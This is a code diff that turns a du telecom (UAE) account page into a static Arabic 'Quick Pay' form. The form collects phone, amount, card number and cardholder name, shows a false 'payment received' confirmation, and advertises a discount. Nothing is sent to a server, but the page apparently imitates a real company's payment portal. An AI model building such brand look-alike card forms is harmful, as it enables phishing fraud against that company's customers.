@@ -4,57 +4,468 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="theme-color" content="#000000">
-    <meta name="description" content="du - myaccount">
+    <meta name="description" content="du - Quick Pay - الدفع السريع">
     <meta name="smartbanner:title" content="du App">
     <meta name="smartbanner:author" content="EITC, du telecom UAE">
     <meta name="smartbanner:price" content="FREE">
     <meta name="smartbanner:price-suffix-apple" content=" - On the App Store">
     <meta name="smartbanner:price-suffix-google" content=" - In Google Play">
-    <meta name="smartbanner:price-suffix-huawei" content=" - In Huawei App store">
-    <meta name="smartbanner:icon-apple" content="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/a6/31/15/a63115cb-005c-83be-475b-a82c5cf273d8/AppIcon-0-0-1x_U007emarketing-0-7-0-sRGB-0-85-220.png/460x0w.webp">
-    <meta name="smartbanner:icon-google" content="https://play-lh.googleusercontent.com/k6XJSozW-ClG8dJb2M203q4kmboblzZyrlPlxqQIBaZX5YIsJz0Vpn3rhVYJQtfyKOA=w480-h960-rw">
-    <meta name="smartbanner:icon-huawei" content="https://appimg-dra.dbankcdn.com/application/icon144/65/471939d268d44844803d70c3dfc58738.png">
-    <meta name="smartbanner:button" content="Use App">
-    <meta name="smartbanner:button-url-apple" content="https://itunes.apple.com/ae/app/du/id521545878?mt=8">
-    <meta name="smartbanner:button-url-google" content="https://play.google.com/store/apps/details?id=duleaf.duapp.splash">
-    <meta name="smartbanner:button-url-huawei" content="https://appgallery.cloud.huawei.com/marketshare/app/C101122217?locale=en_US&source=appshare&subsource=C101122217">
-    <meta name="smartbanner:enabled-platforms" content="android,ios,huawei">
-    <meta name="smartbanner:close-label" content="Close">
     <title>du - My Account</title>
     <link rel="icon" href="/favicon.ico">
-    <link rel="icon" href="/favicon.png">
     <link rel="manifest" href="/manifest.json">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/smartbanner.js/1.14.6/smartbanner.css">
     <link href="/static/css/main.e5272e92.css" rel="stylesheet">
     <style>
-        body {
+        * {
             margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen',
-                'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue',
-                sans-serif;
+                'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', sans-serif;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
-        }
-        #root {
-            width: 100%;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
             min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .app-container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        
+        .header-section {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .header-section h1 {
+            color: #333;
+            font-size: 32px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .header-section p {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        .content-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .form-card {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .form-card h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            color: #555;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 6px;
+            font-size: 14px;
+            font-family: inherit;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus,
+        .form-group select:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 16px rgba(102, 126, 234, 0.4);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .offers-section {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+        }
+        
+        .offers-section h2 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+        
+        .offer-card {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .offer-card h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+        
+        .offer-card p {
+            font-size: 14px;
+            margin-bottom: 15px;
+            opacity: 0.95;
+            line-height: 1.5;
+        }
+        
+        .offer-card a {
+            display: inline-block;
+            color: white;
+            text-decoration: none;
+            font-weight: 600;
+            padding: 8px 16px;
+            background: rgba(255,255,255,0.2);
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+        
+        .offer-card a:hover {
+            background: rgba(255,255,255,0.3);
+        }
+        
+        .features-list {
+            background: #f9f9f9;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        
+        .features-list h4 {
+            color: #333;
+            font-size: 14px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .feature-item {
+            padding: 10px 0;
+            border-bottom: 1px solid #eee;
+            color: #555;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+        
+        .feature-item:last-child {
+            border-bottom: none;
+        }
+        
+        .feature-item strong {
+            color: #333;
+        }
+        
+        .payment-methods {
+            background: #f9f9f9;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+        }
+        
+        .payment-methods h4 {
+            color: #333;
+            font-size: 14px;
+            margin-bottom: 15px;
+            font-weight: 600;
+        }
+        
+        .methods-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(60px, 1fr));
+            gap: 10px;
+        }
+        
+        .method-badge {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            padding: 10px;
+            text-align: center;
+            font-size: 12px;
+            color: #666;
+            font-weight: 500;
+        }
+        
+        .footer-section {
+            background: #333;
+            color: white;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            margin-top: 30px;
+        }
+        
+        .footer-section p {
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .footer-links a {
+            color: #667eea;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+        
+        .footer-links a:hover {
+            color: #764ba2;
+        }
+        
+        .success-message {
+            display: none;
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            border: 1px solid #c3e6cb;
+        }
+        
+        .success-message.show {
+            display: block;
+        }
+        
+        @media (max-width: 768px) {
+            .content-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .header-section h1 {
+                font-size: 24px;
+            }
+            
+            .form-card, .offers-section {
+                padding: 20px;
+            }
         }
     </style>
 </head>
 <body>
-    <noscript>You need to enable JavaScript to run this app.</noscript>
-    <div id="root"></div>
+    <div class="app-container">
+        <!-- Header -->
+        <div class="header-section">
+            <h1>🚀 du Quick Pay - الدفع السريع</h1>
+            <p>ادفع فواتيرك بسهولة وسرعة وأمان</p>
+        </div>
+        
+        <!-- Main Content -->
+        <div class="content-grid">
+            <!-- Form Section -->
+            <div class="form-card">
+                <h2>نموذج الدفع</h2>
+                <div class="success-message" id="successMsg">
+                    ✅ تم استقبال طلبك بنجاح! سيتم معالجة الدفع قريباً.
+                </div>
+                
+                <form id="quickPayForm">
+                    <div class="form-group">
+                        <label for="phone">رقم الهاتف</label>
+                        <input type="tel" id="phone" name="phone" placeholder="أدخل رقم هاتفك" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="amount">المبلغ (درهم)</label>
+                        <input type="number" id="amount" name="amount" placeholder="أدخل المبلغ" min="1" step="0.01" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="cardType">نوع البطاقة</label>
+                        <select id="cardType" name="cardType" required>
+                            <option value="">اختر نوع البطاقة</option>
+                            <option value="visa">Visa</option>
+                            <option value="mastercard">Mastercard</option>
+                            <option value="amex">American Express</option>
+                        </select>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="cardNumber">رقم البطاقة</label>
+                        <input type="text" id="cardNumber" name="cardNumber" placeholder="رقم البطاقة" maxlength="19" required>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label for="cardHolder">اسم صاحب البطاقة</label>
+                        <input type="text" id="cardHolder" name="cardHolder" placeholder="الاسم على البطاقة" required>
+                    </div>
+                    
+                    <button type="submit" class="submit-btn">ادفع الآن</button>
+                </form>
+                
+                <!-- Payment Methods -->
+                <div class="payment-methods">
+                    <h4>💳 طرق الدفع المقبولة</h4>
+                    <div class="methods-grid">
+                        <div class="method-badge">💳 Visa</div>
+                        <div class="method-badge">💳 Mastercard</div>
+                        <div class="method-badge">💳 Amex</div>
+                        <div class="method-badge">🔵 Google Pay</div>
+                        <div class="method-badge">🍎 Apple Pay</div>
+                        <div class="method-badge">🏦 Bank Transfer</div>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- Offers Section -->
+            <div class="offers-section">
+                <h2>العروض والمميزات</h2>
+                
+                <!-- Special Offer -->
+                <div class="offer-card">
+                    <h3>🎁 عرض خاص</h3>
+                    <p>استمتع بخصم 10% على فاتورتك القادمة عند الدفع الآن</p>
+                    <a href="https://www.du.ae/ar">اعرف المزيد →</a>
+                </div>
+                
+                <!-- Features -->
+                <div class="features-list">
+                    <h4>✨ مميزات الدفع السريع</h4>
+                    <div class="feature-item">
+                        <strong>⚡ دفع سريع</strong><br>
+                        أكمل عملية الدفع في ثوان معدودة
+                    </div>
+                    <div class="feature-item">
+                        <strong>🔒 آمن وموثوق</strong><br>
+                        بيانات محمية بأعلى معايير الأمان
+                    </div>
+                    <div class="feature-item">
+                        <strong>💰 طرق دفع متعددة</strong><br>
+                        اختر من بين خيارات دفع متنوعة
+                    </div>
+                    <div class="feature-item">
+                        <strong>📱 دعم الهاتف المحمول</strong><br>
+                        متوافق مع جميع الأجهزة والمتصفحات
+                    </div>
+                </div>
+                
+                <!-- App Download -->
+                <div class="offer-card" style="margin-top: 20px;">
+                    <h3>📱 حمل تطبيق du</h3>
+                    <p>استمتع بتجربة أفضل مع تطبيق du الجديد</p>
+                    <div style="display: flex; gap: 10px;">
+                        <a href="https://itunes.apple.com/ae/app/du/id521545878?mt=8" style="flex: 1;">App Store</a>
+                        <a href="https://play.google.com/store/apps/details?id=duleaf.duapp.splash" style="flex: 1;">Google Play</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer-section">
+            <p>© 2026 جميع الحقوق محفوظة لشركة الإمارات للاتصالات المتكاملة</p>
+            <div class="footer-links">
+                <a href="https://www.du.ae/ar/sitemap">خريطة الموقع</a>
+                <a href="https://www.du.ae/ar/terms-and-conditions">الشروط والاحكام</a>
+                <a href="https://www.du.ae/ar/legal">سياسة الخصوصية</a>
+            </div>
+        </div>
+    </div>
     
-    <!-- React from CDN -->
-    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
-    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
-    
-    <!-- Load the compiled app -->
+    <!-- Scripts -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/smartbanner.js/1.14.6/smartbanner.min.js"></script>
     <script src="//f1-as.readspeaker.com/script/8993/ReadSpeaker.js?pids=embhl" type="text/javascript"></script>
     <script>!function(e,t,a,n,g){e[n]=e[n]||[],e[n].push({"gtm.start":(new Date).getTime(),event:"gtm.js"});var m=t.getElementsByTagName(a)[0],r=t.createElement(a);r.async=!0,r.src="https://www.googletagmanager.com/gtm.js?id=GTM-KJPLS3Q",m.parentNode.insertBefore(r,m)}(window,document,"script","dataLayer")</script>
     
-    <!-- Main app script -->
-    <script defer="defer" src="/static/js/main.541f8879.js"></script>
+    <script>
+        // Form handling
+        document.getElementById('quickPayForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const amount = document.getElementById('amount').value;
+            const cardType = document.getElementById('cardType').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const cardHolder = document.getElementById('cardHolder').value;
+            
+            // Show success message
+            const successMsg = document.getElementById('successMsg');
+            successMsg.classList.add('show');
+            
+            // Log data (in production, send to server)
+            console.log('Payment submitted:', {
+                phone,
+                amount,
+                cardType,
+                cardNumber: cardNumber.slice(-4).padStart(cardNumber.length, '*'),
+                cardHolder
+            });
+            
+            // Reset form
+            setTimeout(() => {
+                this.reset();
+                successMsg.classList.remove('show');
+            }, 3000);
+        });
+        
+        // Format card number input
+        document.getElementById('cardNumber').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
+            e.target.value = formattedValue;
+        });
+    </script>
 </body>
 </html>
